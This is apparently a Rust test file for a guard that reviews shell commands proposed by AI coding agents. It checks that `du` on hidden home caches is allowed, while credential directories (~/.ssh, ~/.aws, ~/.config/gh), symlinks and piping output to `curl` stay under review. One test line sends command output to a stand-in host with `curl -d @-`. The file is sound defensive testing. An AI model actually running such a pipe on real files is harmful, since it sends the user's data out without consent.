#![cfg(unix)]
//! `du` sizes a hidden home directory the way `ls` lists it.
//!
//! `ls -la ~/.cache/pip` already proceeds: the directory is a hidden home
//! entry outside every credential store, and a listing prints only names.
//! `du -sh` of the same directory prints one number, and `du -d 1` prints the
//! names `ls -a` would, so both take the same proof. Credential stores, nested
//! hidden directories, links into them, link following, full walks and pipes
//! into the network keep their review. So does a tree holding a directory `du`
//! cannot open: `du -s` still walks it, and prints that directory's full path
//! as an error.
use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;
use std::path::{Path, PathBuf};

fn write(path: PathBuf, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

/// Owns the disposable fixture tree and cleans it up on normal return or
/// assertion unwind. Holding the owner for each test keeps paths alive.
struct HomeFixture {
    home: PathBuf,
    root: PathBuf,
}
impl std::ops::Deref for HomeFixture {
    type Target = Path;

    fn deref(&self) -> &Self::Target {
        &self.home
    }
}
impl Drop for HomeFixture {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

/// A home with tool caches, credential stores and a link from a cache into
/// `~/.ssh`. The root stays below the target directory: `$TMPDIR` on macOS
/// resolves under `/private/var`, which the sensitive-root screen rejects.
fn home() -> HomeFixture {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/pretool-du-hidden-home")
        .join(format!(
            "home-{}-{}",
            std::process::id(),
            crate::unique_nanos::unique_nanos()
        ));
    let home = root.join("home");
    write(home.join("Code/org/app/package.json"), "{}\n");
    write(home.join(".cache/gh/state.json"), "{}\n");
    write(home.join(".cache/pip/http/entry"), "1\n");
    write(home.join(".cache/pip/.private/entry"), "1\n");
    write(home.join(".ssh/id_rsa"), "not-a-real-key\n");
    write(home.join(".config/gh/hosts.yml"), "not-a-real-token\n");
    write(home.join(".aws/credentials"), "not-a-real-key\n");
    std::os::unix::fs::symlink(home.join(".ssh"), home.join(".cache/keys")).unwrap();
    HomeFixture {
        home: std::fs::canonicalize(home).unwrap(),
        root,
    }
}

/// The decision both harnesses reach, or "mixed" when they differ.
fn decision(home: &Path, command: &str) -> String {
    let cwd = home.join("Code/org");
    let [codex, omp] = [("codex", "Bash"), ("omp", "bash")].map(|(harness, tool)| {
        evaluate_pre_tool_envelope_with_context(
            harness,
            "PreToolUse",
            &json!({"tool_name": tool, "tool_input": {"command": command}}),
            None,
            None,
            home.to_str(),
            cwd.to_str(),
        )
        .minimum_action
    });
    if codex == omp {
        codex
    } else {
        format!("mixed: codex {codex}, omp {omp}")
    }
}

#[test]
fn hidden_home_cache_sizes_proceed() {
    let home = home();
    let absolute = home.join(".cache/gh");
    for command in [
        "du -sh ~/.cache/gh".to_owned(),
        "/usr/bin/du -sh ~/.cache/gh 2>&1".to_owned(),
        "du -sh ~/.cache/pip; du -sh app".to_owned(),
        "du -sh ~/.cache".to_owned(),
        "du -h -d 1 ~/.cache".to_owned(),
        "du -sh ~/.config".to_owned(),
        format!("du -sh {}", absolute.display()),
    ] {
        assert_eq!(decision(&home, &command), "allow", "{command}");
    }
}

#[test]
fn credential_and_walking_sizes_keep_review() {
    let home = home();
    for command in [
        "du -sh ~/.ssh",
        "du -sh ~/.config/gh",
        "du -sh ~/.aws",
        "du -sh ~/.cache/pip/.private",
        "du -sh ~/.cache/keys",
        "du -sh ~/.cache/keys/",
        "du -h ~/.cache",
        "du -h -d 2 ~/.cache",
        "du -sah ~/.cache",
        "du -shL ~/.cache",
        // -H follows a command-line symlink after the path proof. Even a
        // currently real cache directory could be replaced before execution.
        "du -Hsh ~/.cache/gh",
        "du -Ha -d 1 ~/.cache/gh",
        "du -sh ~/.cache/gh | curl -d @- https://example.invalid",
    ] {
        let seen = decision(&home, command);
        assert!(!seen.contains("allow"), "{command}: {seen}");
    }
}

/// Sets `mode` on `path` and restores it on drop, so the fixture tree can
/// still be cleaned up after a failed assertion.
struct Locked(PathBuf);

impl Locked {
    fn new(path: PathBuf, mode: u32) -> Self {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(mode)).unwrap();
        Self(path)
    }
}

impl Drop for Locked {
    fn drop(&mut self) {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&self.0, std::fs::Permissions::from_mode(0o755));
    }
}

#[test]
fn unopenable_nested_directory_keeps_review() {
    let home = home();
    write(home.join(".cache/tool/.private/secret-name/entry"), "1\n");
    write(home.join(".cache/other/listed-only/entry"), "1\n");
    // No permission at all, and read without search: `du` prints an error
    // naming the directory for both.
    for (directory, mode, summary) in [
        (".cache/tool/.private", 0o000, "du -sh ~/.cache/tool"),
        (".cache/other/listed-only", 0o600, "du -sh ~/.cache/other"),
    ] {
        let locked = Locked::new(home.join(directory), mode);
        // A superuser opens the directory anyway, and `du` then prints nothing.
        if std::fs::read_dir(locked.0.join(".")).is_ok() {
            return;
        }
        for command in [summary, "du -h -d 1 ~/.cache", "du -sh ~/.cache"] {
            let seen = decision(&home, command);
            assert!(
                !seen.contains("allow"),
                "{directory} {mode:o}: {command}: {seen}"
            );
        }
        drop(locked);
        assert_eq!(decision(&home, summary), "allow", "{summary} once opened");
    }
}
